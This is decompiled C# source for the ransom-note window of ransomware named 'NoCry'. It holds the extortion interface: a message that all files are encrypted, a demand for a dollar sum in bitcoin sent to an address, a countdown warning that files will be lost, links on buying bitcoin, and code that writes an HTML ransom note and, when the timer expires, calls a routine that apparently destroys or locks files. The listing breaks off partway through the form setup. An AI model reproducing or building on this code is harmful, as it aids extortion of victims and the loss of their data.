using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace NoCry;

[DesignerGenerated]
public class Form1 : Form
{
	private double double_0;

	private double double_1;

	private double double_2;

	private object object_0;

	private object object_1;

	private object object_2;

	private object object_3;

	private object object_4;

	private IContainer icontainer_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	[CompilerGenerated]
	private Timer timer_0;

	[AccessedThroughProperty("BackgroundWorker1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private BackgroundWorker backgroundWorker_0;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ClassStyle(createParams.get_ClassStyle() | 0x200);
			return createParams;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_0;
			PictureBox pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				((Control)pictureBox).remove_Click(eventHandler);
			}
			_PictureBox1 = value;
			pictureBox = _PictureBox1;
			if (pictureBox != null)
			{
				((Control)pictureBox).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_4;
			Button button = _Button1;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button1 = value;
			button = _Button1;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("GroupBox1")]
	internal virtual GroupBox GroupBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox2")]
	internal virtual PictureBox PictureBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_1;
			Button button = _Button2;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button2 = value;
			button = _Button2;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("TextBox1")]
	internal virtual TextBox TextBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("GroupBox2")]
	internal virtual GroupBox GroupBox2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label6")]
	internal virtual Label Label6
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual LinkLabel LinkLabel1
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(method_5);
			LinkLabel linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel1 = value;
			linkLabel = _LinkLabel1;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	internal virtual LinkLabel LinkLabel2
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(method_2);
			LinkLabel linkLabel = _LinkLabel2;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel2 = value;
			linkLabel = _LinkLabel2;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	internal virtual Button Button3
	{
		[CompilerGenerated]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_6;
			Button button = _Button3;
			if (button != null)
			{
				((Control)button).remove_Click(eventHandler);
			}
			_Button3 = value;
			button = _Button3;
			if (button != null)
			{
				((Control)button).add_Click(eventHandler);
			}
		}
	}

	internal virtual LinkLabel LinkLabel3
	{
		[CompilerGenerated]
		get
		{
			return _LinkLabel3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_000d: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(method_7);
			LinkLabel linkLabel = _LinkLabel3;
			if (linkLabel != null)
			{
				linkLabel.remove_LinkClicked(val);
			}
			_LinkLabel3 = value;
			linkLabel = _LinkLabel3;
			if (linkLabel != null)
			{
				linkLabel.add_LinkClicked(val);
			}
		}
	}

	[field: AccessedThroughProperty("Panel1")]
	internal virtual Panel Panel1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label7")]
	internal virtual Label Label7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label8")]
	internal virtual Label Label8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label9")]
	internal virtual Label Label9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label10")]
	internal virtual Label Label10
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = method_8;
			Timer val = timer_0;
			if (val != null)
			{
				val.remove_Tick(eventHandler);
			}
			timer_0 = value;
			val = timer_0;
			if (val != null)
			{
				val.add_Tick(eventHandler);
			}
		}
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[CompilerGenerated]
		get
		{
			return backgroundWorker_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = method_9;
			BackgroundWorker backgroundWorker = backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
			}
			backgroundWorker_0 = value;
			backgroundWorker = backgroundWorker_0;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
			}
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		object_0 = Interaction.GetSetting("H", "0", Class13.string_15, "");
		object_1 = Interaction.GetSetting("M", "0", Class13.string_15, "");
		object_2 = Interaction.GetSetting("S", "0", Class13.string_15, "");
		object_3 = Interaction.GetSetting("P", "0", Class13.string_15, "");
		object_4 = Interaction.GetSetting("X", "0", Class13.string_15, "");
		InitializeComponent();
	}

	private void method_0(object sender, EventArgs e)
	{
	}

	private void method_1(object sender, EventArgs e)
	{
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Clipboard.SetText(TextBox1.get_Text());
			MessageBox.Show("Copied To Clipboard");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			Label1.set_Text("Send $" + Class13.string_9 + " worth of bitcoin to this address:");
			TextBox1.set_Text(Class13.string_7);
			if (Operators.ConditionalCompareObjectEqual(object_0, (object)null, false))
			{
				Interaction.SaveSetting("H", "0", Class13.string_15, Conversions.ToString(Class13.int_0));
				double_0 = Conversions.ToDouble(Interaction.GetSetting("H", "0", Class13.string_15, ""));
				int maximum = Conversions.ToInteger(Interaction.GetSetting("H", "0", Class13.string_15, ""));
				ProgressBar1.set_Maximum(maximum);
			}
			else
			{
				double_0 = Conversions.ToDouble(Interaction.GetSetting("H", "0", Class13.string_15, ""));
			}
			if (Operators.ConditionalCompareObjectEqual(object_1, (object)null, false))
			{
				Interaction.SaveSetting("M", "0", Class13.string_15, Conversions.ToString(Class13.int_1));
				double_1 = Conversions.ToDouble(Interaction.GetSetting("M", "0", Class13.string_15, ""));
			}
			else
			{
				double_1 = Conversions.ToDouble(Interaction.GetSetting("M", "0", Class13.string_15, ""));
			}
			if (Operators.ConditionalCompareObjectEqual(object_2, (object)null, false))
			{
				Interaction.SaveSetting("S", "0", Class13.string_15, Conversions.ToString(59));
				double_2 = Conversions.ToDouble(Interaction.GetSetting("S", "0", Class13.string_15, ""));
			}
			else
			{
				double_2 = Conversions.ToDouble(Interaction.GetSetting("S", "0", Class13.string_15, ""));
			}
			if (Operators.ConditionalCompareObjectEqual(object_3, (object)null, false))
			{
				Interaction.SaveSetting("P", "0", Class13.string_15, Conversions.ToString(0));
				int value = Conversions.ToInteger(Interaction.GetSetting("P", "0", Class13.string_15, ""));
				ProgressBar1.set_Value(value);
			}
			else
			{
				int value2 = Conversions.ToInteger(Interaction.GetSetting("P", "0", Class13.string_15, ""));
				ProgressBar1.set_Value(value2);
			}
			if (Operators.ConditionalCompareObjectEqual(object_4, (object)null, false))
			{
				Interaction.SaveSetting("X", "0", Class13.string_15, Conversions.ToString(Class13.int_0));
				int maximum2 = Conversions.ToInteger(Interaction.GetSetting("X", "0", Class13.string_15, ""));
				ProgressBar1.set_Maximum(maximum2);
			}
			else
			{
				int maximum3 = Conversions.ToInteger(Interaction.GetSetting("X", "0", Class13.string_15, ""));
				ProgressBar1.set_Maximum(maximum3);
			}
			Timer1.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_2(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://www.google.com/search?q=how+to+buy+bitcoin");
	}

	private void method_3(object sender, EventArgs e)
	{
		((Control)Class2.Class3_0.Form2_0).Show();
	}

	private void method_4(object sender, EventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		Form2 form = new Form2();
		((Form)form).set_StartPosition((FormStartPosition)4);
		((Form)form).ShowDialog();
	}

	private void method_5(object sender, LinkLabelLinkClickedEventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		Form3 form = new Form3();
		((Form)form).set_StartPosition((FormStartPosition)4);
		((Form)form).ShowDialog();
	}

	private void method_6(object sender, EventArgs e)
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		Form4 form = new Form4();
		((Form)form).set_StartPosition((FormStartPosition)4);
		((Form)form).ShowDialog();
	}

	private void method_7(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("https://en.wikipedia.org/wiki/Bitcoin");
	}

	private void method_8(object sender, EventArgs e)
	{
		try
		{
			if ((double_0 == 0.0) & (double_1 == 0.0))
			{
				Label9.set_Text("0");
				Label7.set_Text("0");
				Timer1.Stop();
				((Control)this).Hide();
				Interaction.SaveSetting("D", "0", Class13.string_15, "OK");
				Class9.smethod_0();
			}
			else
			{
				Label9.set_Text(Conversions.ToString(double_0));
				Label7.set_Text(Conversions.ToString(double_1));
				Interaction.SaveSetting("H", "0", Class13.string_15, Conversions.ToString(double_0));
				Interaction.SaveSetting("M", "0", Class13.string_15, Conversions.ToString(double_1));
				Interaction.SaveSetting("S", "0", Class13.string_15, Conversions.ToString(double_2));
			}
			if (double_1 == 0.0)
			{
				double_0 -= 1.0;
				double_1 = 59.0;
				ProgressBar1.Increment(1);
				Interaction.SaveSetting("P", "0", Class13.string_15, Conversions.ToString(ProgressBar1.get_Value()));
			}
			else if (double_2 == 0.0)
			{
				double_1 -= 1.0;
				double_2 = 59.0;
			}
			else
			{
				double_2 -= 1.0;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(object sender, DoWorkEventArgs e)
	{
		do
		{
			_ = 1;
			Thread.Sleep(2000);
		}
		while (!Class11.smethod_14(Class13.string_1));
		Interaction.SaveSetting("F", "0", Class13.string_15, "Done");
		Interaction.SaveSetting("C", "0", Class13.string_15, "Done");
		string html = Class6.html;
		html = html.Replace("%M%", "$" + Class13.string_9);
		html = html.Replace("%BTC%", Class13.string_7);
		html = html.Replace("%Email%", Class13.string_8);
		StreamWriter streamWriter = new StreamWriter(Class13.string_6, append: false);
		streamWriter.WriteLine(html);
		streamWriter.Close();
		if (BackgroundWorker1.IsBusy && BackgroundWorker1.WorkerSupportsCancellation)
		{
			BackgroundWorker1.CancelAsync();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ec: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0102: Expected O, but got Unknown
		//IL_0103: Unknown result type (might be due to invalid IL or missing references)
		//IL_010d: Expected O, but got Unknown
		//IL_010e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_03c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ca: Expected O, but got Unknown
		//IL_04b2: Unknown result type (might be due to invalid IL or missing references)
		//IL_04bc: Expected O, but got Unknown
		//IL_0545: Unknown result type (might be due to invalid IL or missing references)
		//IL_054f: Expected O, but got Unknown
		//IL_05d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_05de: Expected O, but got Unknown
		//IL_0660: Unknown result type (might be due to invalid IL or missing references)
		//IL_066a: Expected O, but got Unknown
		//IL_073b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0745: Expected O, but got Unknown
		//IL_07dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_07e7: Expected O, but got Unknown
		//IL_0880: Unknown result type (might be due to invalid IL or missing references)
		//IL_088a: Expected O, but got Unknown
		//IL_0938: Unknown result type (might be due to invalid IL or missing references)
		//IL_0942: Expected O, but got Unknown
		//IL_0a89: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a93: Expected O, but got Unknown
		//IL_0caf: Unknown result type (might be due to invalid IL or missing references)
		//IL_0cb9: Expected O, but got Unknown
		//IL_0d3b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d45: Expected O, but got Unknown
		//IL_0dc7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0dd1: Expected O, but got Unknown
		//IL_0fe0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fea: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Button1 = new Button();
		GroupBox1 = new GroupBox();
		Button2 = new Button();
		TextBox1 = new TextBox();
		Label1 = new Label();
		PictureBox2 = new PictureBox();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		Label5 = new Label();
		GroupBox2 = new GroupBox();
		Label6 = new Label();
		LinkLabel1 = new LinkLabel();
		LinkLabel2 = new LinkLabel();
		Button3 = new Button();
		LinkLabel3 = new LinkLabel();
		PictureBox1 = new PictureBox();
		Panel1 = new Panel();
		ProgressBar1 = new ProgressBar();
		Label7 = new Label();
		Label8 = new Label();
		Label9 = new Label();
		Label10 = new Label();
		Timer1 = new Timer(icontainer_0);
		BackgroundWorker1 = new BackgroundWorker();
		((Control)GroupBox1).SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		((Control)GroupBox2).SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)Panel1).SuspendLayout();
		((Control)this).SuspendLayout();
		((ButtonBase)Button1).set_BackColor(Color.White);
		((Control)Button1).set_Cursor(Cursors.get_Hand());
		((Control)Button1).set_ForeColor(Color.Black);
		((Control)Button1).set_Location(new Point(388, 383));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(189, 29));
		((Control)Button1).set_TabIndex(2);
		((ButtonBase)Button1).set_Text("Decrypt");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(false);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Button2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)PictureBox2);
		((Control)GroupBox1).set_Location(new Point(154, 297));
		((Control)GroupBox1).set_Name("GroupBox1");
		((Control)GroupBox1).set_Size(new Size(423, 80));
		((Control)GroupBox1).set_TabIndex(3);
		GroupBox1.set_TabStop(false);
		((ButtonBase)Button2).set_BackColor(Color.White);
		((Control)Button2).set_Cursor(Cursors.get_Hand());
		((Control)Button2).set_ForeColor(Color.Black);
		((Control)Button2).set_Location(new Point(371, 41));
		((Control)Button2).set_Name("Button2");
		((Control)Button2).set_Size(new Size(46, 23));
		((Control)Button2).set_TabIndex(4);
		((ButtonBase)Button2).set_Text("Copy");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(false);
		((Control)TextBox1).set_Location(new Point(116, 42));
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		((Control)TextBox1).set_Size(new Size(249, 20));
		((Control)TextBox1).set_TabIndex(4);
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.FromArgb(192, 192, 0));
		((Control)Label1).set_Location(new Point(118, 17));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(0, 13));
		((Control)Label1).set_TabIndex(4);
		PictureBox2.set_Image((Image)(object)Class6.bitcoin);
		((Control)PictureBox2).set_Location(new Point(0, 24));
		((Control)PictureBox2).set_Name("PictureBox2");
		((Control)PictureBox2).set_Size(new Size(110, 38));
		PictureBox2.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox2.set_TabIndex(4);
		PictureBox2.set_TabStop(false);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Tahoma", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(189, 12));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(342, 18));
		((Control)Label2).set_TabIndex(5);
		Label2.set_Text("Ooooops All Your Files Are Encrypted ,NoCry");
		Label3.set_AutoSize(true);
		((Control)Label3).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label3).set_ForeColor(Color.White);
		((Control)Label3).set_Location(new Point(6, 27));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(356, 16));
		((Control)Label3).set_TabIndex(6);
		Label3.set_Text("Yes, You Can Recover All Your Files Easily And Quickly");
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label4).set_ForeColor(Color.White);
		((Control)Label4).set_Location(new Point(6, 89));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(73, 16));
		((Control)Label4).set_TabIndex(7);
		Label4.set_Text("But How ?");
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		((Control)Label5).set_Location(new Point(6, 118));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(277, 32));
		((Control)Label5).set_TabIndex(8);
		Label5.set_Text("Send The Required Amount And\r\nI Will Send The Key To You For Decryption");
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label6);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox2).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox2).set_Font(new Font("Tahoma", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)GroupBox2).set_ForeColor(Color.White);
		((Control)GroupBox2).set_Location(new Point(154, 47));
		((Control)GroupBox2).set_Name("GroupBox2");
		((Control)GroupBox2).set_Size(new Size(423, 244));
		((Control)GroupBox2).set_TabIndex(6);
		GroupBox2.set_TabStop(false);
		GroupBox2.set_Text("Can I Recover My Files ?");
		Label6.set_AutoSize(true);
		((Control)Label6).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		((Control)Label6).set_Location(new Point(6, 208));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(137, 16));
		((Control)Label6).set_TabIndex(9);
		Label6.set_Text("See You Soon (0_0)");
		((Label)LinkLabel1).set_AutoSize(true);
		((Control)LinkLabel1).set_Cursor(Cursors.get_Hand());
		((Control)LinkLabel1).set_Font(new Font("Tahoma", 11.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		LinkLabel1.set_LinkColor(Color.FromArgb(0, 192, 192));
		((Control)LinkLabel1).set_Location(new Point(12, 383));
		((Control)LinkLabel1).set_Name("LinkLabel1");
		((Control)LinkLabel1).set_Size(new Size(88, 18));
		((Control)LinkLabel1).set_TabIndex(10);
		LinkLabel1.set_TabStop(true);
		LinkLabel1.set_Text("Contact Us");
		((Label)LinkLabel2).set_AutoSize(true);
		((Control)LinkLabel2).set_Cursor(Cursors.get_Hand());
		((Control)LinkLabel2).set_Font(new Font("Tahoma", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		LinkLabel2.set_LinkColor(Color.FromArgb(0, 192, 192));
		((Control)LinkLabel2).set_Location(new Point(12, 345));
		((Control)LinkLabel2).set_Name("LinkLabel2");
		((Control)LinkLabel2).set_Size(new Size(125, 16));
		((Control)LinkLabel2).set_TabIndex(11);
		LinkLabel2.set_TabStop(true);
		LinkLabel2.set_Text("How to buy bitcoins?");
		((ButtonBase)Button3).set_BackColor(Color.White);
		((Control)Button3).set_Cursor(Cursors.get_Hand());
		((Control)Button3).set_ForeColor(Color.Black);
		((Control)Button3).set_Location(new Point(154, 383));
		((Control)Button3).set_Name("Button3");
		((Control)Button3).set_Size(new Size(189, 29));
		((Control)Button3).set_TabIndex(4);
		((ButtonBase)Button3).set_Text("Show Encrypted Files");
		((ButtonBase)Button3).set_UseVisualStyleBackColor(false);
		((Label)LinkLabel3).set_AutoSize(true);
		((Control)LinkLabel3).set_Cursor(Cursors.get_Hand());
		((Control)LinkLabel3).set_Font(new Font("Tahoma", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		LinkLabel3.set_LinkColor(Color.FromArgb(0, 192, 192));
		((Control)LinkLabel3).set_Location(new Point(12, 311));
		((Control)LinkLabel3).set_Name("LinkLabel3");
		((Control)LinkLabel3).set_Size(new Size(82, 16));
		((Control)LinkLabel3).set_TabIndex(12);
		LinkLabel3.set_TabStop(true);
		LinkLabel3.set_Text("About bitcoin");
		PictureBox1.set_Image((Image)(object)Class6.Pic1);
		((Control)PictureBox1).set_Location(new Point(12, 12));
		((Control)PictureBox1).set_Name("PictureBox1");
		((Control)PictureBox1).set_Size(new Size(134, 131));
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		((Control)Panel1).set_BackColor(Color.Maroon);
		Panel1.set_BorderStyle((BorderStyle)2);
		((Control)Panel1).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)Panel1).get_Controls().Add((Control)(object)Label7);
		((Control)Panel1).get_Controls().Add((Control)(object)Label8);
		((Control)Panel1).get_Controls().Add((Control)(object)Label9);
		((Control)Panel1).set_Location(new Point(18, 220));
		((Control)Panel1).set_Name("Panel1");
		((Control)Panel1).set_Size(new Size(119, 51));
		((Control)Panel1).set_TabIndex(13);
		((Control)ProgressBar1).set_Location(new Point(2, 32));
		ProgressBar1.set_Maximum(71);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		((Control)ProgressBar1).set_Size(new Size(109, 10));
		((Control)ProgressBar1).set_TabIndex(4);
		Label7.set_AutoSize(true);
		((Control)Label7).set_Font(new Font("Tahoma", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.White);
		((Control)Label7).set_Location(new Point(73, 4));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(38, 25));
		((Control)Label7).set_TabIndex(3);
		Label7.set_Text("00");
		Label8.set_AutoSize(true);
		((Control)Label8).set_Font(new Font("Tahoma", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label8).set_ForeColor(Color.White);
		((Control)Label8).set_Location(new Point(47, 4));
		((Control)Label8).set_Name("Label8");
		((Control)Label8).set_Size(new Size(20, 25));
		((Control)Label8).set_TabIndex(2);
		Label8.set_Text(":");
		Label9.set_AutoSize(true);
		((Control)Label9).set_Font(new Font("Tahoma", 15.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label9).set_ForeColor(Color.White);
		((Control)Label9).set_Location(new Point(3, 4));
		((Control)Label9).set_Name("Label9");
		((Control)Label9).set_Size(new Size(38, 25));
		((Control)Label9).set_TabIndex(1);
		Label9.set_Text("00");
		Label10.set_AutoSize(true);
		((Control)Label10).set_ForeColor(Color.White);
		((Control)Label10).set_Location(new Point(15, 193));
		((Control)Label10).set_Name("Label10");
		((Control)Label10).set_Size(new Size(125, 13));
		((Control)Label10).set_TabIndex(14);
		Label10.set_Text("Your files will be lost on :");
		Timer1.set_Interval(1000);
		BackgroundWorker1.WorkerReportsProgress = true;
		BackgroundWorker1.WorkerSupportsCancellation = true;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
